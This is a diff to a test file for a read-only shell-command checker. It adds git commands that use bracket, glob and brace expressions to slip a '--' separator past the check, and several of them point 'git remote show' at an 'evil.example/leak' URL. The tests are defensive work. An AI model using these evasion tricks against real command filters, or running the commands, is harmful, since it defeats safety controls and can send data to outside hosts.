@@ -240,6 +240,14 @@ describe('evaluateShellCommandReadOnly', () => {
       // `--`, but shell-quote leaves it as plain text (#14359).
       'git remote show origin [--][--] -n',
       'git remote show https://evil.example/leak [-]- -n',
+      // Bracket expressions such as `[]-]` and `[[:punct:]]` match `-` too.
+      'git remote show origin []-]- -n',
+      'git remote show https://evil.example/leak [[:punct:]]- -n',
+      // `*`, `?` and brace globs reach the same `--`; the argument guard in
+      // isShellCommandReadOnly refuses them before the remote check runs.
+      'git remote show origin * -n',
+      'git remote show origin ?? -n',
+      'git remote show origin {--,x} -n',
       'git diff --output=patch',
       'git log --output=log.out',
       'git show --output=show.out HEAD',
